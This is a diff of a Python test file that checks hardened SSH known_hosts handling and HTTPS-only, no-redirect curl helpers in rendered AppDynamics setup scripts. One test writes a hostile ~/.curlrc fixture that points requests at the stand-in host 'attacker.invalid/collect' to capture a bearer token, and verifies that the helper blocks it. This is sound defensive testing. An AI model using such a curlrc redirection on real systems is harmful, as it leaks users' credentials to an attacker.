@@ -2,10 +2,13 @@ from __future__ import annotations
 
 import importlib.util
 import json
+import os
 import shlex
 import subprocess
 import sys
 from pathlib import Path
+
+import pytest
 
 
 REPO_ROOT = Path(__file__).resolve().parents[1]
@@ -239,21 +242,59 @@ def test_appd_host_apply_helper_atomic_write_rollback_and_ssh_command(tmp_path: 
     assert sudo_calls[0]["sudo"] is True
     assert "sha256sum" in sudo_calls[0]["command"]
 
+    known_hosts = tmp_path / "known_hosts"
+    known_hosts.write_text("app01.example.com ssh-ed25519 AAAATESTKEY\n", encoding="utf-8")
+    known_hosts.chmod(0o600)
     ssh_target = {
         "host": "app01.example.com",
         "execution": "ssh",
         "ssh_user": "appdynamics",
         "ssh_key_file": "/secure/id_rsa",
-        "ssh_known_hosts_file": "/secure/known_hosts",
+        "ssh_known_hosts_file": str(known_hosts),
     }
-    command = helper.build_ssh_command(ssh_target, "systemctl restart appdynamics-machine-agent", sudo=True)
-    joined = " ".join(shlex.quote(part) for part in command)
-    assert "ssh" in command[0]
-    assert "-i /secure/id_rsa" in joined
-    assert "UserKnownHostsFile=/secure/known_hosts" in joined
-    assert "StrictHostKeyChecking=yes" in joined
-    assert "appdynamics@app01.example.com" in command
-    assert "sudo -n bash -lc" in joined
+    with helper.pinned_known_hosts_file(ssh_target) as trusted_known_hosts:
+        assert trusted_known_hosts != known_hosts
+        assert trusted_known_hosts.read_bytes() == known_hosts.read_bytes()
+        command = helper.build_ssh_command(
+            ssh_target,
+            "systemctl restart appdynamics-machine-agent",
+            sudo=True,
+            trusted_known_hosts=trusted_known_hosts,
+        )
+        joined = " ".join(shlex.quote(part) for part in command)
+        assert "ssh" in command[0]
+        assert "-i /secure/id_rsa" in joined
+        assert f"UserKnownHostsFile={trusted_known_hosts}" in joined
+        assert "GlobalKnownHostsFile=/dev/null" in joined
+        assert "StrictHostKeyChecking=yes" in joined
+        assert "accept-new" not in joined
+        assert "appdynamics@app01.example.com" in command
+        assert "sudo -n bash -lc" in joined
+    assert not trusted_known_hosts.exists()
+
+    with pytest.raises(ValueError, match="ssh_known_hosts_file"):
+        with helper.pinned_known_hosts_file(
+            {"host": "app01.example.com", "execution": "ssh", "ssh_user": "appdynamics"}
+        ):
+            pass
+
+    symlink_path = tmp_path / "known_hosts-symlink"
+    symlink_path.symlink_to(known_hosts)
+    with pytest.raises(ValueError, match="securely open"):
+        with helper.pinned_known_hosts_file({**ssh_target, "ssh_known_hosts_file": str(symlink_path)}):
+            pass
+
+    hardlink_path = tmp_path / "known_hosts-hardlink"
+    os.link(known_hosts, hardlink_path)
+    with pytest.raises(ValueError, match="single-link"):
+        with helper.pinned_known_hosts_file(ssh_target):
+            pass
+    hardlink_path.unlink()
+
+    known_hosts.chmod(0o666)
+    with pytest.raises(ValueError, match="group/world writable"):
+        with helper.pinned_known_hosts_file(ssh_target):
+            pass
 
 
 def test_appd_thousandeyes_apply_requires_gate() -> None:
@@ -303,20 +344,117 @@ def test_rendered_appd_probe_scripts_support_lab_tls(tmp_path: Path) -> None:
     assert "APPD_CA_CERT" in platform_probe
     assert "APPD_VERIFY_SSL" in platform_probe
     assert "appd_curl --fail --silent --show-error --max-time 10" in platform_probe
+    assert 'curl -q "${APPD_CURL_TLS_ARGS[@]}"' in platform_probe
+    assert "--proto '=https' --proto-redir '=https' --max-redirs 0 --globoff" in platform_probe
     assert '\ncurl --fail --silent --show-error --max-time 10 "${CONTROLLER_URL}/"' not in platform_probe
 
     controller = render_skill("splunk-appdynamics-controller-admin-setup", tmp_path / "controller-tls")
     controller_plan = (controller / "controller-admin-api-plan.sh").read_text(encoding="utf-8")
     assert "APPD_CA_CERT" in controller_plan
     assert "APPD_VERIFY_SSL" in controller_plan
-    assert 'appd_curl --fail --silent --show-error --config "${CURL_CONFIG}"' in controller_plan
+    assert 'appd_authenticated_curl "${CURL_CONFIG}" --fail --silent --show-error' in controller_plan
+    assert '--config "${CURL_CONFIG}"' not in controller_plan
     assert '-H "Authorization: Bearer' not in controller_plan
+    assert 'appd_write_header_config "${APPD_OAUTH_TOKEN_FILE}"' in controller_plan
+    assert 'OAUTH_TOKEN="$(<"${APPD_OAUTH_TOKEN_FILE}")"' not in controller_plan
+    assert ",," not in controller_plan
 
     agent = render_skill("splunk-appdynamics-agent-management-setup", tmp_path / "agent-tls")
     agent_probe = (agent / "smart-agent-validation-probes.sh").read_text(encoding="utf-8")
     assert "APPD_CA_CERT" in agent_probe
     assert "APPD_VERIFY_SSL" in agent_probe
     assert "appd_curl --fail --silent --show-error --max-time 10" in agent_probe
+
+    analytics = render_skill("splunk-appdynamics-analytics-setup", tmp_path / "analytics-transport")
+    analytics_plan = (analytics / "analytics-publish-plan.sh").read_text(encoding="utf-8")
+    assert "appd_curl --fail-with-body" in analytics_plan
+    assert 'credential_curl_stream_file "${APPD_EVENTS_PAYLOAD_FILE}"' in analytics_plan
+    assert '--data-binary @"${APPD_EVENTS_PAYLOAD_FILE}"' not in analytics_plan
+    assert 'EVENTS_API_KEY="$(<"${APPD_EVENTS_API_KEY_FILE}")"' not in analytics_plan
+    assert 'source "${PROJECT_ROOT}/skills/shared/lib/appdynamics_helpers.sh"' in analytics_plan
+    shared_transport = (SKILLS_DIR / "shared/lib/credential_curl_helpers.sh").read_text(
+        encoding="utf-8"
+    )
+    assert "--proto '=https' --proto-redir '=https' --max-redirs 0 --globoff" in shared_transport
+    assert "APPD_ANALYTICS_ENDPOINT must be a credential-free HTTPS origin URL" in analytics_plan
+
+
+def test_rendered_appd_authenticated_curl_rejects_hostile_policy_overrides(tmp_path: Path) -> None:
+    platform = render_skill("splunk-appdynamics-platform-setup", tmp_path / "platform-policy")
+    rendered = (platform / "platform-validation-probes.sh").read_text(encoding="utf-8")
+    helper = rendered.split('\nLIVE=', maxsplit=1)[0]
+
+    fake_bin = tmp_path / "bin"
+    fake_bin.mkdir()
+    fake_curl = fake_bin / "curl"
+    fake_curl.write_text(
+        '#!/usr/bin/env bash\nprintf \'<%s>\\n\' "$@" >> "${CURL_LOG}"\n',
+        encoding="utf-8",
+    )
+    fake_curl.chmod(0o700)
+
+    home = tmp_path / "home"
+    home.mkdir()
+    (home / ".curlrc").write_text(
+        'location\nurl = "https://attacker.invalid/collect"\n',
+        encoding="utf-8",
+    )
+    auth_config = tmp_path / "auth.curl"
+    auth_config.write_text('header = "Authorization: Bearer test-token"\n', encoding="utf-8")
+    auth_config.chmod(0o600)
+    curl_log = tmp_path / "curl.log"
+    runner = tmp_path / "run-helper.sh"
+    runner.write_text(
+        helper
+        + r'''
+if [[ "${2:-}" == "hostile" ]]; then
+  appd_authenticated_curl "$1" --location https://controller.example.com/controller/api/rbac/v1/users
+else
+  appd_authenticated_curl "$1" --fail --silent https://controller.example.com/controller/api/rbac/v1/users
+fi
+''',
+        encoding="utf-8",
+    )
+    runner.chmod(0o700)
+    env = {
+        **os.environ,
+        "PATH": f"{fake_bin}:{os.environ['PATH']}",
+        "HOME": str(home),
+        "CURL_LOG": str(curl_log),
+    }
+
+    valid = subprocess.run(
+        ["bash", str(runner), str(auth_config), "valid"],
+        cwd=REPO_ROOT,
+        env=env,
+        capture_output=True,
+        text=True,
+        check=False,
+        timeout=120,
+    )
+    assert valid.returncode == 0, valid.stderr + valid.stdout
+    curl_args = curl_log.read_text(encoding="utf-8").splitlines()
+    assert curl_args[0] == "<-q>"
+    assert "<--proto>" in curl_args
+    assert "<=https>" in curl_args
+    assert "<--max-redirs>" in curl_args
+    assert "<0>" in curl_args
+    assert "<--globoff>" in curl_args
+    assert "https://attacker.invalid/collect" not in "\n".join(curl_args)
+
+    curl_log.write_text("", encoding="utf-8")
+    hostile = subprocess.run(
+        ["bash", str(runner), str(auth_config), "hostile"],
+        cwd=REPO_ROOT,
+        env=env,
+        capture_output=True,
+        text=True,
+        check=False,
+        timeout=120,
+    )
+    assert hostile.returncode == 2
+    assert "redirect controls" in hostile.stderr
+    assert curl_log.read_text(encoding="utf-8") == ""
 
 
 def test_cli_help_for_all_appdynamics_skills() -> None:
@@ -851,6 +989,15 @@ def test_appd_thousandeyes_integration_artifacts_are_gated_and_secret_safe(tmp_p
     assert "/v7/connectors/generic" in apply_plan
     assert "/v7/operations/webhooks" in apply_plan
     assert "/operations/webhooks/${OPERATION_ID}/connectors" in apply_plan
+    assert "curl -q" in apply_plan
+    assert "--proto '=https' --proto-redir '=https' --max-redirs 0 --globoff" in apply_plan
+    assert "connector OAuth token URL must remain on the reviewed Controller origin" in apply_plan
+    assert 'credential_curl_write_header_config "${TE_TOKEN_FILE}"' in apply_plan
+    assert 'credential_curl_stream_file "${CONNECTOR_PAYLOAD}"' in apply_plan
+    assert 'credential_curl_stream_file "${OPERATION_FILE}"' in apply_plan
+    assert '--data-binary @"${CONNECTOR_PAYLOAD}"' not in apply_plan
+    assert '--data-binary @"${OPERATION_FILE}"' not in apply_plan
+    assert 'TE_TOKEN="$(<"${TE_TOKEN_FILE}")"' not in apply_plan
 
     native = (out / "te-native-appd-integration-runbook.md").read_text(encoding="utf-8")
     assert "Manage > Integrations" in native
@@ -1032,6 +1179,11 @@ def test_cluster_agent_values_rendering(tmp_path: Path) -> None:
     assert "K8S_APPLY=1" in rollout
     o11y = (out / "o11y-export-validation.sh").read_text(encoding="utf-8")
     assert "X-SF-Token" in o11y
+    assert "curl -q" in o11y
+    assert "--proto '=https' --proto-redir '=https' --max-redirs 0 --globoff" in o11y
+    assert "SPLUNK_O11Y_API_URL must be a credential-free HTTPS origin URL" in o11y
+    assert 'credential_curl_write_header_config "${SPLUNK_O11Y_ACCESS_TOKEN_FILE}"' in o11y
+    assert 'O11Y_TOKEN="$(<"${SPLUNK_O11Y_ACCESS_TOKEN_FILE}")"' not in o11y
     runbook = (out / "combined-agent-o11y-runbook.md").read_text(encoding="utf-8")
     assert "dual" in runbook
     assert "Splunk Observability Cloud" in runbook
